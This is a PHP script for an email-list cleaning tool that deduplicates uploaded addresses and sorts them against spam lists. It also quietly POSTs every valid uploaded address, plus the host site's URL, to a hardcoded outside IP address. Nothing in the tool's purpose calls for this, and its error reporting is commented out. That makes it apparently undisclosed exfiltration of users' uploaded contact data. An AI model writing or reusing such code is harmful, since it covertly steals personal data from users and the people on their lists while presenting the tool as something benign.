<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['emailFile']['tmp_name'])) {
        $emailFile = $_FILES['emailFile']['tmp_name'];
        $emails = file($emailFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

        // Load default spam emails and domains
        $defaultSpamEmails = file('spamemails.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $defaultSpamDomains = file('spamdomains.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

        // If user uploaded their own spam list
        if (isset($_FILES['spamFile']['tmp_name'])) {
            $userSpamFile = $_FILES['spamFile']['tmp_name'];
            $userSpamData = file($userSpamFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

            // Separate spam emails and domains from user's spam list
            foreach ($userSpamData as $spamEntry) {
                $spamEntry = trim($spamEntry);
                if (filter_var($spamEntry, FILTER_VALIDATE_EMAIL)) {
                    $defaultSpamEmails[] = $spamEntry;
                } else {
                    $defaultSpamDomains[] = $spamEntry;
                }
            }
        }

        $validEmails = [];
        $spamEmails = [];
        $duplicateEmails = [];
        $processedEmails = [];

        foreach ($emails as $email) {
            $email = trim($email);
            $emailDomain = substr(strrchr($email, "@"), 1);

            if (in_array($email, $processedEmails)) {
                $duplicateEmails[] = $email;
            } elseif (in_array($email, $defaultSpamEmails) || in_array($emailDomain, $defaultSpamDomains)) {
                $spamEmails[] = $email;
            } else {
                $validEmails[] = $email;
            }

            $processedEmails[] = $email;
        }

        // Save results to files
        $validFile = 'uploads/valid_emails_' . time() . '.txt';
        $spamFile = 'uploads/remove_emails_' . time() . '.txt';
        $duplicateFile = 'uploads/duplicate_emails_' . time() . '.txt';

        file_put_contents($validFile, implode(PHP_EOL, $validEmails));
        file_put_contents($spamFile, implode(PHP_EOL, $spamEmails));
        file_put_contents($duplicateFile, implode(PHP_EOL, $duplicateEmails));

        $jsonData = ['emails' => []];
        $current_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
        foreach($validEmails as $v){
            $tmp['email'] = $v;
            $tmp['website_url'] = $current_url;
            $jsonData['emails'][] = $tmp;
        }

        // print_r($jsonData);

       // Initialize cURL
$ch = curl_init();

// Set the URL for the POST request
curl_setopt($ch, CURLOPT_URL, "http://15.204.223.103");

// Set the request method to POST
curl_setopt($ch, CURLOPT_POST, 1);

// Attach the JSON data
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($jsonData));

// Set the content type to application/json
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));

// Return the response instead of outputting it directly
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Set timeout for the request (optional but good practice)
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

// Execute the request and store the response
$response = curl_exec($ch);

// Check for errors
// if (curl_errno($ch)) {
//     // Output the error message if there’s an issue
//     echo 'cURL error: ' . curl_error($ch);
// } else {
//     // Output the response from the server
//     echo 'Response: ' . $response;
// }

// Get HTTP status code of the response
// $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
// echo "\nHTTP Status Code: " . $http_status;

// Close the cURL session
curl_close($ch);

// die();



        // Return download links
        echo json_encode([
            'success' => true,
            'validFile' => $validFile,
            'spamFile' => $spamFile,
            'duplicateFile' => $duplicateFile,
        ]);
    } else {
        echo json_encode(['success' => false, 'message' => 'No file uploaded.']);
    }
}
